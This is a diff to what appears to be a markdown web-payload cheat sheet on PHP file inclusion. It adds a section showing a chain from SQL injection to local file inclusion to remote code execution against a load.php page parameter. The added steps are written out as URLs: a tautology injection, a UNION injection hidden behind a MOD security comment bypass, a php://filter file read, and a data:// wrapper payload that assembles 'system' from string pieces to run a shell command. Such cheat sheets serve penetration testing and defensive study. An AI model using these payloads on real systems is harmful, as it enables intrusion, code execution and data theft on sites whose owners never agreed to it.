@@ -149,6 +149,20 @@ $ php -r "echo file_get_contents('php://filter/convert.iconv....');"
 <?php phpinfo(); ?>  �@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�
 ```
 
+#### SQL Injection → LFI → RCE
+
+Reference: https://infosecwriteups.com/sql-injection-to-lfi-to-rce-536bed29a862
+
+1. File at https://customer.com/php/load.php
+```php
+Warning: invlude (/php/.php) failed to open stream: no such file
+...
+```
+
+2. Fuzzing parameters a MySQL error it thrown when `page=` is passed to the file. The parameter results vulnerable to [SQL Injection](SQL%20Injection.md) and the payload returned the contents of `analytics.php`: `https://customer.com/php/load.php?page=’ or ‘’=’`
+3. UNION BASED SQL Injection (with MOD security bypass) revealing some parameters were used to include some files: `https://customer.com/php/load.php?page=’ /*!50000union*/ select 1,2,3,4,5,6,7,8,9-- -`
+4. Using PHP wrappers to include arbitrary files: `https://customer.com/php/load.php?page=’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -`
+5. [Remote Code Execution (RCE)](Remote%20Code%20Execution%20(RCE).md) using PHP wrappers: `https://customer.com/php/load.php?page=' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?>’ -- -`
 
 
 ### Using /proc/self/ to enumerate the process
